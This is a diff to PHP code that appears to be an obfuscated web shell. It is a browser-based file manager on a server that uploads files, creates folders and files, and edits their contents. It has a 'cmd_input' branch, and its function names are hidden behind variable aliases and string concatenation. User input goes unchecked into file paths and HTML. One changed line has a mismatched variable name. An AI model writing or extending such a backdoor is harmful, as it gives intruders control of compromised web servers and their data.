@@ -224,23 +224,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             echo "<hr>Sorry, there was an error uploading your file.<hr>";
         }
     } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
-        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
-        if (!file_exists($newFolder)) {
-
-            $mek($newFolder);
-            echo '<hr>Folder created successfully!';
-        } else {
-            echo '<hr>Error: Folder already exists!';
+        $ff = $_POST['folder_name'];
+        $newFolder = $currentDirectory . '/' . $ff;
+        if (!file_exists($newfolder)) {
+            if ($mek($newFolder) !== false) {
+                echo '<hr>Folder created successfully!';
+            }else{
+                echo '<hr>Error: Failed to create folder!';
+            }
         }
+
     } elseif (isset($_POST['file_name'])) {
         $fileName = $_POST['file_name'];
         $newFile = $currentDirectory . '/' . $fileName;
         if (!file_exists($newFile)) {
             if ($fpc($newFile, '') !== false) {
-                echo '<hr>File created successfully!';
+                echo '<hr>File created successfully!' . $fileName .' ';
+                $fileToView = $newFile;
+                if (file_exists($fileToView)) {
+                    $fileContent = $fgc($fileToView);
+                    $viewCommandResult = '<hr><p>Result: ' . $fileName . '</p>
+                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
+                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
+                    <input type="hidden" name="edit_file" value="' . $fileName . '">
+                    <input type="submit" value=" Save "></form></td>';
+                } else {
+                    $viewCommandResult = '<hr><p>Error: File not found!</p>';
+                }
             } else {
                 echo '<hr>Error: Failed to create file!';
             }
+        }else{
+            echo '<hr>Error: File Already Exists!';
         }
     } elseif (isset($_POST['cmd_input'])){
         $p = "p"."u"."t"."e"."n"."v";
